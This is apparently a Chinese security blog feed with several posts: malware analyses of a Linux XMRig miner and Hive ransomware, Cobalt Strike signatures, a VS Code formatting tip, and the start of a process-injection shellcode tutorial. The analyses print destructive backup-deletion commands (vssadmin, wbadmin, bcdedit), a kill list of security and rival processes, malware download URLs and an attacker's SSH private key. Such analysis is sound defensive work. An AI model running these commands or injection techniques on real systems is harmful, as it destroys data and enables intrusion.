<span class="string">&#x27;solr\.sh&#x27;</span></span><br><span class="line">pkill -9 <span class="string">&#x27;\.rsyslogds&#x27;</span></span><br><span class="line">pkill -9 sysDworker</span><br><span class="line">pkill -9 pnscan</span><br><span class="line">pkill -9 masscan</span><br><span class="line">pkill -9 juiceSSH</span><br><span class="line">pkill -9 sysguard</span><br><span class="line">pkill -9 kdevtmpfsi</span><br><span class="line">pkill -9 solrd</span><br><span class="line">pkill -9 polska</span><br><span class="line">pkill -9 meminitsrv</span><br><span class="line">pkill -9 networkservice</span><br><span class="line">pkill -9 sysupdate</span><br><span class="line">pkill -9 phpguard</span><br><span class="line">pkill -9 phpupdate</span><br><span class="line">pkill -9 networkmanager</span><br><span class="line">pkill -9 knthread</span><br><span class="line">pkill -9 mysqlserver</span><br><span class="line">pkill -9 gitlabkill</span><br><span class="line">pkill -9 watchbog</span><br><span class="line">pkill -9 bashirc</span><br><span class="line">pkill -9 zgrab</span><br></pre></td></tr></table></figure><p>3、&#x2F;proc目录下保留kthreaddk进程，清理掉其他两种情况的进程<br><img src="/../uploads/2022/10/1023208550.png" alt="2022-10-28T10:15:01.png" title="2022-10-28T10:15:01.png"><br>4、强制卸载阿里云盾（安骑士）<br><img src="/../uploads/2022/10/2182386228.png" alt="2022-10-28T10:15:15.png" title="2022-10-28T10:15:15.png"><br>5、结束自身老版本病毒的进程，判断是否有进程kthreaddk。如果没有则下载最<br>新版本<br><img src="/../uploads/2022/10/2395732684.png" alt="2022-10-28T10:15:26.png" title="2022-10-28T10:15:26.png"><br>6、利用服务器SSH密钥进行横向移动<br><img src="/../uploads/2022/10/2266291260.png" alt="2022-10-28T10:15:40.png" title="2022-10-28T10:15:40.png"></p><h2 id="XMRig挖矿"><a href="#XMRig挖矿" class="headerlink" title="XMRig挖矿"></a>XMRig挖矿</h2><p>主程序运行后样本会创建守护线程（go routine）来守护矿机进程和文件，再将XMRig挖矿程序释放后<br>重命名为kthreaddk，以及挖矿配置文件config.json进行挖矿。<br>同时，为了增强挖矿活动隐蔽性，门罗币挖矿程序在被加载到内存后会被横向传播模块删除（挖矿进程<br>若被kill掉，会由横向传播模块重新释放）。<br>矿池地址为：194.145.xx.xx:5443，矿池与C2地址一致，并且本地配置和抓包都没有看到钱包地址，<br>因此推测此版本使用的是病毒作者自建的矿池。<br><img src="/../uploads/2022/10/3300125283.png" alt="2022-10-28T10:22:02.png" title="2022-10-28T10:22:02.png"></p><h1 id="IoCs"><a href="#IoCs" class="headerlink" title="IoCs"></a>IoCs</h1><p><strong>IP：</strong> 194.145.xx.xx<br><strong>矿池：</strong>194.145.xx.xx:5443</p><h1 id="Url"><a href="#Url" class="headerlink" title="Url"></a>Url</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://194.145.xx.xx/ldr.sh</span><br><span class="line">http://194.145.xx.xx/sys.x86_64</span><br></pre></td></tr></table></figure><p>MD5</p><p>文件名</p><p>备注</p><p>5EA36231B6xxxxx5491BE4</p><p>ldr.sh</p><p>恶意主脚本</p><p>35ABF3204E5A2xxxxxA5AB9B19582</p><p>sys.x86_64</p><p>Linux版横向传播模块</p><h1 id="ssh公钥"><a href="#ssh公钥" class="headerlink" title="ssh公钥"></a>ssh公钥</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">ssh-rsa</span><br><span class="line">AAAAB3NzaC1yc2EAAAADAQABAAABAQDaR3U1flcG9SHro9t6G8jRQsUR5ozQjsgx7x30UTwcxnrbk74L</span><br><span class="line">IHeTBTNZ3nak2JeqEmT85xxxxxxxxxxxXyZMNkjWsbnPuk0yzQ7i33hlLdrDeO9+XUV</span><br><span class="line">duIjfbMtrsSjg1Sk7GG9jTDi7xxxxxxxxxxxxxxxxxxxxxxxFCHzY93o6g2rHtkXEpgZ5qOZeMMONvC</span><br><span class="line">z6aUlesOWsrYA9xE6zlgvaq/kmHyZr/HmxdA9moMd+yPrZfG055VWSRT9ijv4XCRrunXZvg7pZtI+kJs</span><br><span class="line">L/P7eW9/mkA9Z3TucP2buHy/TBFgyywZT1Etwppzz1nzTIKEGNs9</span><br></pre></td></tr></table></figure><h1 id="openssh私钥"><a href="#openssh私钥" class="headerlink" title="openssh私钥"></a>openssh私钥</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">-----BEGIN OPENSSH PRIVATE KEY-----</span><br><span class="line">b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn</span><br><span class="line">NhAAAAAwEAAQAAAQEA2kd1NX5XBvUh66PbehvI0ULFEeaM0I7IMe8d9FE8HMZ625O+CyB3</span><br><span class="line">kwUzWd52pNiXqhJk/OXcYKNsdi+vJAA09Gj1/QGoIWV8mTDZI1rG5z7pNMs0O4t94ZS3aw</span><br><span class="line">3jvfl1FXbiI3xxxxxxxxxxxxxxxxxxxxxxxxxxxxx5Jh8ma/x5sXQPZqDHfsj62XxtOeVV</span><br><span class="line">kkU/Yo7+Fwka7p12b4O6WbSPpCbC/z+3lvf5pAPWd07nD9m7h8v0wRYMssGU9RLcKac89Z</span><br><span class="line">80yChBjbPQAAA8B/rfQef630HgAAAAdzc2gtcnNhAAABAQDaR3U1flcG9SHro9t6G8jRQs</span><br><span class="line">UR5ozQjsgx7x30UTwcxnrbk74LIHeTBTNZ3nak2JeqEmT85dxgo2x2L68kADT0aPX9Aagh</span><br><span class="line">ZXyZMNkjWsbnPuk0yzQ7i33hlLdrDeO9+XUVduIjfbMtrsSjg1Sk7GG9jTDi7vBQvqHbQe</span><br><span class="line">rWu6cycDuQKb8mmFCHzY9xxxxxxxxxxxxxxxxxxxxxxxxxxxxxtI+kJsL/P7eW9/mkA9Z3</span><br><span class="line">TucP2buHy/TBFgyywZT1Etwppzz1nzTIKEGNs9AAAAAwEAAQAAAQBwJhbKjUcZhAkRkPbL</span><br><span class="line">HktneO7X66Sd4z5oqXqydKp1/mRRPO9/uAa3uwxPOEWtHLuP3jOU3GUGIfEwJ//Md269xM</span><br><span class="line">/eVmOUBRinfLmTuKhJV8FqJp2Hmnvq0wYKMvC4QtstVA+MPKE673iIqolq0yjEwy5C6pD+</span><br><span class="line">a3Otu4h1G6Uj/CKTUDSs72XYqdh3SzGtKwHstrFSBjckJ6g7U98u/mV9vSIMWxBNeHJM1P</span><br><span class="line">aj/Yg1azyAcUGWO3zxVFtDbKNwyo6qZVjB0wIMOZq3rMMq7OHIotiutYZHW9W+0gXLgH4A</span><br><span class="line">xsQiQuNftmF8WZyLhV4pa3WSEetul1duVEkrsPUfwfoBAAAAgQC4qOdMPYfAkQRKROjIIN</span><br><span class="line">MKmx/+oJl5kCe1nErljyA7ZhhX64RZmH2cUPq3ytrLL4IDfCe7jEKeiemW1jtH3x35vsmX</span><br><span class="line">ORzPv7z+J3kpWQrWzEv6/Q4vqEBzk7uHi3lUebfDWdVwG0kGvPVWEJO50HodG0MIeiPEWX</span><br><span class="line">r5IjCrAEuxBgAAAIEA/hTNaq5WmXwiQfuVq2tTp5GgIYzcmkCZwZ+AsvRXiKT8oTuJtY3P</span><br><span class="line">0Zkgp1qoaN2enE3kikoReZPWA7b2gL9LjZo/v9QQc/7U4hIXP1ZC6xp22r9V08GtHUkNxp</span><br><span class="line">mok0Wl4B5LepQx505mB1RGprx79GEYN3nIz6MjHqt039jdevEAAACBANvtcRIDU2ShmQwn</span><br><span class="line">LhgZxZWLJIuI+oo686Gs+iHZ3IACrUzqAwsg5kCE7n1l2JX6IhqVQmQlEFAH3PlXsiXy8f</span><br><span class="line">LnBwrKLlLLR4q76nebCKMJid0AnPxI8VNnEtCltM9SjR+FTDpRStEQ12iqzxb1vOMyG0NN</span><br><span class="line">KlfhEQR66qqhkW0NAAAAA2tAawECAwQFBgc=</span><br><span class="line">-----END OPENSSH PRIVATE KEY-----</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Cobalt Strike样本的字符串特征</title>
      <link href="/2d95d09a67d1/"/>
      <url>/2d95d09a67d1/</url>
      
        <content type="html"><![CDATA[<ol><li>字符串 <code>MSSE-%d-server</code> 模式.</li><li>rdata头部的管道名格式：<code>%c%c%c%c%c%c%c%c%cMSSE-%d-server</code></li></ol><p><a href="https://www.anquanke.com/post/id/228123#h2-6">https://www.anquanke.com/post/id/228123#h2-6</a><br><a href="https://blog.nviso.eu/2021/04/26/anatomy-of-cobalt-strike-dll-stagers/">https://blog.nviso.eu/2021/04/26/anatomy-of-cobalt-strike-dll-stagers/</a></p>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Cobalt Strike </tag>
            
            <tag> 特征 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>vscode vue 自动格式化</title>
      <link href="/3ab801940286/"/>
      <url>/3ab801940286/</url>
      
        <content type="html"><![CDATA[<h1 id="教程开始"><a href="#教程开始" class="headerlink" title="教程开始"></a>教程开始</h1><p>第一步，先打开vscode软件，方便快捷的方式就直接使用快捷键ctrl+,（是ctrl加逗号）唤出快速搜索条界面。</p><p><img src="/../uploads/2022/07/2897619371.png" alt="l5wdl1op.png" title="l5wdl1op.png"></p><p>第二步，接下来先设定自动保存文件，搜索框贴入files.autoSave筛出设置项，并把设置项属性选择为onFocuschange。</p><p><img src="/../uploads/2022/07/2570791196.png" alt="l5wdl7vu.png" title="l5wdl7vu.png"></p><p>第三步，设定编辑器默认代码格式化（美化）的插件为Prettier，同理在搜索设置框贴入editor.defaultFormatter，将配置项选择为Prettier。</p><p><img src="/../uploads/2022/07/4194159376.png" alt="l5wdld2y.png" title="l5wdld2y.png"></p><p>第四步，设定Prettier插件保存时自动格式化代码，搜索设置项贴入editor.formatOnSave，将如下图所示的选项框打钩即可。</p><p><img src="/../uploads/2022/07/1145953003.png" alt="l5wdlo70.png" title="l5wdlo70.png"></p><h1 id="注意，注意，注意"><a href="#注意，注意，注意" class="headerlink" title="注意，注意，注意"></a>注意，注意，注意</h1><p>这样的效果是全局的，会使所有的文件都用这格式化，如果开启了其他项目，容易格式化冲突，<br>打开你的setting.json,找到刚才的编辑设置，如下</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">&quot;editor.defaultFormatter&quot;</span><span class="punctuation">:</span> <span class="string">&quot;esbenp.prettier-vscode&quot;</span></span><br></pre></td></tr></table></figure><p>修改为</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">&quot;[vue]&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;editor.defaultFormatter&quot;</span><span class="punctuation">:</span> <span class="string">&quot;esbenp.prettier-vscode&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br></pre></td></tr></table></figure><p>这样的话只对vue生效，不会影响其他</p><p>作者：哆啦在这A梦在哪<br>链接：<a href="https://www.jianshu.com/p/8a7553db8311">https://www.jianshu.com/p/8a7553db8311</a><br>来源：简书<br>著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。</p>]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
          <category> vue </category>
          
      </categories>
      
      
        <tags>
            
            <tag> vscode </tag>
            
            <tag> 格式化 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hive勒索病毒样本分析报告</title>
      <link href="/be3e42984caa/"/>
      <url>/be3e42984caa/</url>
      
        <content type="html"><![CDATA[<h1 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h1><hr><p>  Hive勒索病毒家族于2021年6月被首次发现，之后也保持着非常活跃的攻击趋势。同时hive也对自身进行了多次的版本更迭。本次样本为Rust语言的变异版本。<br>  该hive病毒样本同样采用了非对称+对称算法的加密方案，但是在文件加密阶段使用的对称加密算法有别于主流加密方式。Hive在加密文件时并未采用标准的对称加密算法，如AES、DES、salsa20、RC4等，而是使用了自定义的流加密方式。</p><h1 id="名词解释"><a href="#名词解释" class="headerlink" title="名词解释"></a>名词解释</h1><hr><p>该样本隶属于 <strong>Hive</strong> 家族。Hive家族通常通过钓鱼邮件，远程桌面协议，漏洞利用进行攻击。<br>相关攻击工具：Cobalt Strike、Coroxy、ConnectWise Automate 端点管理漏洞等</p><h1 id="相关文件-IoCs"><a href="#相关文件-IoCs" class="headerlink" title="相关文件(IoCs)"></a>相关文件(IoCs)</h1><hr><p>windows_x64_encrypt.exe：样本主程序<br>MD5: 109652cfb3*9cdc0e4<br>SHA1: 8c315_*_7d2519d70485965c5f<br>SHA256: dac0e015c3669dcec**bd7fee51e87f193016ae529</p><h1 id="样本危害"><a href="#样本危害" class="headerlink" title="样本危害"></a>样本危害</h1><hr><p>a. 重要文件无法读取<br>b. 关键数据被损坏<br>c. 被感染者需要通过缴纳高额赎金才能获取解密密钥恢复数据文件的正常使用，<strong>多数情况即使缴纳了高额的赎金也未必能正常恢复数据</strong></p><h1 id="传播方式"><a href="#传播方式" class="headerlink" title="传播方式"></a>传播方式</h1><hr><p>Hive家族通常通过钓鱼邮件，远程桌面协议，漏洞利用等方式进行下发。</p><h1 id="样本行为"><a href="#样本行为" class="headerlink" title="样本行为"></a>样本行为</h1><hr><h2 id="1、停止可能妨碍攻击链的相关工具服务和进程"><a href="#1、停止可能妨碍攻击链的相关工具服务和进程" class="headerlink" title="1、停止可能妨碍攻击链的相关工具服务和进程"></a>1、停止可能妨碍攻击链的相关工具服务和进程</h2><h3 id="1-1、遍历进程"><a href="#1-1、遍历进程" class="headerlink" title="1.1、遍历进程"></a>1.1、遍历进程</h3><p>通过遍历进程快照寻找指定进程。<br><img src="/../uploads/2022/10/1323496217.png" alt="2022-10-24T07:11:53.png" title="2022-10-24T07:11:53.png"><br><img src="/../uploads/2022/10/4206319223.png" alt="2022-10-24T07:12:15.png" title="2022-10-24T07:12:15.png"></p><h3 id="1-2、尝试模拟trustedinstaller-exe和winlogon-exe的进程令牌"><a href="#1-2、尝试模拟trustedinstaller-exe和winlogon-exe的进程令牌" class="headerlink" title="1.2、尝试模拟trustedinstaller.exe和winlogon.exe的进程令牌"></a>1.2、尝试模拟trustedinstaller.exe和winlogon.exe的进程令牌</h3><p><img src="/../uploads/2022/10/3170151007.png" alt="2022-10-24T07:12:28.png" title="2022-10-24T07:12:28.png"></p><h3 id="1-3、停止的服务和进程"><a href="#1-3、停止的服务和进程" class="headerlink" title="1.3、停止的服务和进程"></a>1.3、停止的服务和进程</h3><p>与大多数复杂的恶意软件一样，Hive 会停止安全解决方案和其他可能妨碍其攻击链的相关工具的服务和进程。Hive 尝试模拟trustedinstaller.exe和winlogon.exe的进程令牌，以便它有足够的权限可以停止Microsoft Defender Antivirus 以及其他服务。</p><ul><li><strong>停止以下服务</strong></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">windefend, msmpsvc, kavsvc, antivirservice, zhudongfungyu, vmm, vmwp, sql, sap, oracle, mepocs, veeam, backup, vss, msexchange, mysql, sophos, pdfservice, backupexec, gxblr, gxvss, gxclmgrs, gxvcd, gxcimgr, gxmmm, gxvsshwprov, gxfwd, sap, qbcfmonitorservice, qbidpservice, acronisagent, veeam, mvarmor, acrsch2svc</span><br></pre></td></tr></table></figure><ul><li><strong>结束相关进程</strong></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dbsnmp, dbeng50, bedbh, excel, encsvc, visios, firefox, isqlplussvc, mspub, mydesktopqos, notepad, ocautoupds, ocomm, ocssd, onenote, outlook, sqbcoreservice, sql, steam, tbirdconfig, thunderbird, winword, wordpad, xfssvccon, vxmon, benetns, bengien, pvlsvr, raw_agent_svc, cagservice, sap, qbidpservice, qbcfmonitorservice, teamviewer_service, teamviewer, tv_w32, tv_x64, cvd, saphostexec, sapstartsrv, avscc, dellsystemdetect, enterpriseclient, veeam, thebat, cvfwd, cvods, vsnapvss, msaccess, vaultsvc, beserver, appinfo, qbdmgrn, avagent, spooler, powerpnt, cvmountd, synctime, oracle, wscsvc, winmgmt, sql</span><br></pre></td></tr></table></figure><p><strong>内存视图：</strong></p><p><img src="/../uploads/2022/10/189190035.png" alt="2022-10-24T07:12:40.png" title="2022-10-24T07:12:40.png"></p><h2 id="2、启动进程"><a href="#2、启动进程" class="headerlink" title="2、启动进程"></a>2、启动进程</h2><p>作为其勒索软件活动的一部分，Hive 通常会执行删除备份并阻止数据恢复的进程及指令。版本之间存在差异，有些样本可能不会执行所有进程。<br><strong>进程及指令为如下信息：</strong></p><ul><li>“vssadmin.exe delete shadows &#x2F;all &#x2F;quiet”</li><li>“wbadmin.exe delete systemstatebackup”</li><li>“wbadmin.exe delete catalog -quiet”</li><li>“bcdedit.exe &#x2F;set {default} recoveryenabled No”</li><li>“bcdedit.exe &#x2F;set {default} bootstatuspolicy ignoreallfailures”</li><li>“wbadmin.exe delete systemstatebackup -keepVersions:3”</li></ul><h3 id="2-1、删除Windows备份目录"><a href="#2-1、删除Windows备份目录" class="headerlink" title="2.1、删除Windows备份目录"></a>2.1、删除Windows备份目录</h3><p><img src="/../uploads/2022/10/314548616.png" alt="2022-10-24T07:13:01.png" title="2022-10-24T07:13:01.png"></p><p><img src="/../uploads/2022/10/1327038912.png" alt="2022-10-24T07:13:11.png" title="2022-10-24T07:13:11.png"></p><p><img src="/../uploads/2022/10/3007810745.png" alt="2022-10-24T07:13:19.png" title="2022-10-24T07:13:19.png"></p><h3 id="2-2、删除卷影拷贝"><a href="#2-2、删除卷影拷贝" class="headerlink" title="2.2、删除卷影拷贝"></a>2.2、删除卷影拷贝</h3><p><img src="/../uploads/2022/10/221621319.png" alt="2022-10-24T07:13:33.png" title="2022-10-24T07:13:33.png"></p><h3 id="2-3、通过bcdedit命令修改Windows启动设置"><a href="#2-3、通过bcdedit命令修改Windows启动设置" class="headerlink" title="2.3、通过bcdedit命令修改Windows启动设置"></a>2.3、通过bcdedit命令修改Windows启动设置</h3><p><img src="/../uploads/2022/10/3039694438.png" alt="2022-10-24T07:13:47.png" title="2022-10-24T07:13:47.png"></p><p><img src="/../uploads/2022/10/1966195616.png" alt="2022-10-24T07:13:57.png" title="2022-10-24T07:13:57.png"></p><h2 id="3、勒索信"><a href="#3、勒索信" class="headerlink" title="3、勒索信"></a>3、勒索信</h2><p><strong>内存视图如下所示：</strong><br><img src="/../uploads/2022/10/993410291.png" alt="2022-10-24T07:14:15.png" title="2022-10-24T07:14:15.png"><br><strong>下图为勒索信内容，其中Login和Password为示例账户信息</strong><br><img src="/../uploads/2022/10/3287164733.png" alt="2022-10-24T07:14:36.png" title="2022-10-24T07:14:36.png"><br>被勒索后需要使用上述账号密码进行登录勒索网站，其目的是用来辨别受害者。</p><h2 id="4、加密"><a href="#4、加密" class="headerlink" title="4、加密"></a>4、加密</h2><blockquote><p>本样本使用的加密方式为：椭圆曲线 Diffie-Hellmann (ECDH) 与 Curve25519和 XChaCha20-Poly1305 （使用 ChaCha20 对称密码的认证加密）。</p></blockquote><p>  它不同于其他勒索病毒在每个文件中嵌入一个加密密钥，而是在内存中生成两组密钥，使用它们来加密文件，然后将这些密钥集写入它加密的驱动器的根目录，两者都使用 .key 扩展名。<br>  为了指示使用哪个密钥集来加密文件，将包含相应加密密钥的 .key 文件名称添加到磁盘上加密文件的名称中，后跟一个下划线，然后是一个 Base64 字符串。一旦经过 Base64 解码，该字符串将包含两个偏移量，每个偏移量指向相应.key文件中的不同位置。这样，攻击者可以使用这些偏移量解密文件。</p><h3 id="4-1、密钥集生成"><a href="#4-1、密钥集生成" class="headerlink" title="4.1、密钥集生成"></a>4.1、密钥集生成</h3><p>分配了大小为 0xCFFF00 字节的缓冲区。使用两个自定义函数生成随机字节，并填充该缓冲区。该缓冲区的前 0xA00000 字节由随机字节填充，剩余的 0x2FFF00 字节从缓冲区前0x2FFF00字节中复制。<br>每个缓冲区的内容是一个密钥集。由于分配了两个缓冲区，因此有两个密钥集。在加密过程中，恶意软件从其中一个密钥集中为每个文件随机选择不同的密钥，并通过将密钥的字节序列与文件内容进行异或运算来使用它们来加密文件。<br><strong>密钥集生成代码：</strong><br><img src="/../uploads/2022/10/2224921792.png" alt="2022-10-24T07:15:03.png" title="2022-10-24T07:15:03.png"><br><strong>get_random_byte代码：</strong><br><img src="/../uploads/2022/10/353289642.png" alt="2022-10-24T07:15:15.png" title="2022-10-24T07:15:15.png"><br><strong>准备密钥集的自定义散列：</strong><br><img src="/../uploads/2022/10/1628723839.png" alt="2022-10-24T07:15:32.png" title="2022-10-24T07:15:32.png"></p><h3 id="4-2、加密过程"><a href="#4-2、加密过程" class="headerlink" title="4.2、加密过程"></a>4.2、加密过程</h3><p><strong>在计算哈希并解密其他几个字符串后，加密过程采取以下步骤：</strong><br>1、使用上面介绍的相同功能生成victim_private_key<br><img src="/../uploads/2022/10/2926896623.png" alt="2022-10-24T07:15:54.png" title="2022-10-24T07:15:54.png"><br>2、使用 ECDH 和 Curve25519生成victim_public_key 。参数是victim_private_key，basepoint是9，后跟31个0<br><img src="/../uploads/2022/10/3813064274.png" alt="2022-10-24T07:16:09.png" title="2022-10-24T07:16:09.png"><br>3、为 XChaCha 算法生成一个 24 字节的随机数<br><img src="/../uploads/2022/10/2563952711.png" alt="2022-10-24T07:16:19.png" title="2022-10-24T07:16:19.png"><br>4、使用带有 Curve25519 的 ECDH生成shared_secret 。参数是victim_private_key和hive_public_key。然后，使用带有hive_public_key（作为随机数）的 shared_secret（作为密钥）使用 ChaCha20 派生密钥<br><img src="/../uploads/2022/10/3207571924.png" alt="2022-10-24T07:16:33.png" title="2022-10-24T07:16:33.png"><br>5、使用 Poly1305-XChaCha20 加密密钥集。用于加密的值是密钥集、derived_key、nonce 和嵌入的关联数据 (AD)。此函数对密钥集进行加密，并在加密密钥缓冲区的末尾添加一个 16 字节的身份验证标签<br><img src="/../uploads/2022/10/2501649254.png" alt="2022-10-24T07:16:45.png" title="2022-10-24T07:16:45.png"><br>  到此密钥集最终被加密完。nonce、victim_public_key、当前加密的密钥集和身份验证标签依次复制到一个新的缓冲区。这个缓冲区（我们标记为encrypted_structure_1）被视为一个新的密钥集，它使用上述相同的方法再次加密，但使用第二个hive_public_key。这一次，该函数输出新的 nonce、victim_private_key等。只有关联的数据是相同的。</p><p>  最后， second_nonce、second_victim_public_key和加密的encrypted_structure_1的新缓冲区被写入该样本正在加密的驱动器的根目录（例如C:\）。create_extension函数根据之前创建的自定义散列的前六个字节生成 Base64 字符串。这个 Base64 字符串作为文件名，文件的扩展名就是“.key”。</p><p><strong>根据自定义散列的前六个字节生成 Base64 字符串:</strong><br><img src="/../uploads/2022/10/3790976859.png" alt="2022-10-24T07:16:58.png" title="2022-10-24T07:16:58.png"><br><strong>使用 Base64 字符串作为文件名：</strong><br><img src="/../uploads/2022/10/2297053729.png" alt="2022-10-24T07:17:07.png" title="2022-10-24T07:17:07.png"></p><h3 id="4-3、下图说明该样本的加密流程："><a href="#4-3、下图说明该样本的加密流程：" class="headerlink" title="4.3、下图说明该样本的加密流程："></a>4.3、下图说明该样本的加密流程：</h3><p><img src="/../uploads/2022/10/208838076.png" alt="2022-10-24T07:17:25.png" title="2022-10-24T07:17:25.png"><br>  如上图所示，“密钥集加密流程”执行了两次。在第一轮中，加密原始值。在第二轮中，它以“encrypted_structure_1”作为被加密数据执行。在第二次执行中，除了AD(关联数据)和 Basepoint 9以外数据均发生改变。<br>  因此，以下值在第二次执行中均为新值：victim_private_key、victim_public_key、hive_public_key、nonce、shared_secret和derived_key。</p><h3 id="4-4、文件加密"><a href="#4-4、文件加密" class="headerlink" title="4.4、文件加密"></a>4.4、文件加密</h3><p>两个密钥文件都写入磁盘后，多线程文件加密开始执行。在加密每个文件之前，恶意软件会根据字符串列表检查其名称和扩展名。如果匹配，则不会加密该文件。例如，如果 .exe 在字符串列表中，则扩展名为 .exe 的文件将不会被加密。并且该列表是在运行时加密和解密的。</p>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Hive </tag>
            
            <tag> 勒索病毒 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>更好的ShellCode编写方式</title>
      <link href="/09b07ee049fa/"/>
      <url>/09b07ee049fa/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>在我们日常编程中，有可能为的只是一个函数的调用的情况，导致我们需要写一个DLL注入到目标进程中。就笔者个人而言，笔者更喜欢集成在一个EXE中。所以这个时候最好的解决方式就是ShellCode。而外面已有的Shellcode编写大部分都是最终生成二进制数据，我个人认为是比较麻烦的。所以这里我带来了一个另类思路。</p><h1 id="编写方式"><a href="#编写方式" class="headerlink" title="编写方式"></a>编写方式</h1><p>1、构造一个结构体，里面用来填充ShellCode所需要内容。切记禁止有需要间接访问的内容。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">using</span> MessageBoxW_t = <span class="built_in">INT</span>(WINAPI*)(_In_opt_ HWND hWnd, _In_opt_ LPCWSTR lpText, _In_opt_ LPCWSTR lpCaption, _In_ UINT uType);</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">ShellCodeInfo</span> &#123;</span><br><span class="line">    MessageBoxW_t MessageBoxW;</span><br><span class="line">    <span class="type">const</span> <span class="type">wchar_t</span>* szText;</span><br><span class="line">    <span class="type">const</span> <span class="type">wchar_t</span>* szCaption;</span><br><span class="line">    UINT uType;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>2、组装参数并把结构体写入到目标进程中</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 组装参数</span></span><br><span class="line">ShellCodeInfo shellcodeInfo&#123;&#125;;</span><br><span class="line">shellcodeInfo.MessageBoxW = (MessageBoxW_t)MessageBoxW;</span><br><span class="line"><span class="type">const</span> <span class="type">wchar_t</span> szText[]&#123; <span class="string">L&quot;测试ShellCode&quot;</span> &#125;;</span><br><span class="line"><span class="type">const</span> <span class="type">wchar_t</span> szCaption[]&#123; <span class="string">L&quot;标题&quot;</span> &#125;;</span><br><span class="line"><span class="built_in">memcpy_s</span>((<span class="type">void</span>*)shellcodeInfo.szText, <span class="keyword">sizeof</span> shellcodeInfo.szText, szText, <span class="keyword">sizeof</span> szText);</span><br><span class="line"><span class="built_in">memcpy_s</span>((<span class="type">void</span>*)shellcodeInfo.szCaption, <span class="keyword">sizeof</span> shellcodeInfo.szCaption, szCaption, <span class="keyword">sizeof</span> szCaption);</span><br><span class="line">shellcodeInfo.uType = MB_OK;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 将参数映射到目标进程</span></span><br><span class="line">LPBYTE lpParamBuff = <span class="built_in">reinterpret_cast</span>&lt;BYTE*&gt;(<span class="built_in">VirtualAllocEx</span>(hProcess, <span class="literal">nullptr</span>, <span class="built_in">sizeof</span>(ShellCodeInfo), MEM_COMMIT  MEM_RESERVE, PAGE_READWRITE));</span><br><span class="line"><span class="keyword">if</span> (!lpParamBuff) &#123;</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (!<span class="built_in">WriteProcessMemory</span>(hProcess, lpParamBuff, &amp;shellcodeInfo, <span class="built_in">sizeof</span>(ShellCodeInfo), <span class="literal">nullptr</span>)) &#123;</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>3、准备一个函数，用来当作ShellCode函数。切记禁止写与地址相关的代码。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">DWORD <span class="title">RemoteMessageBox</span><span class="params">(ShellCodeInfo* shellcodeInfo)</span> </span>&#123;</span><br><span class="line">    shellcodeInfo-&gt;<span class="built_in">MessageBoxW</span>(<span 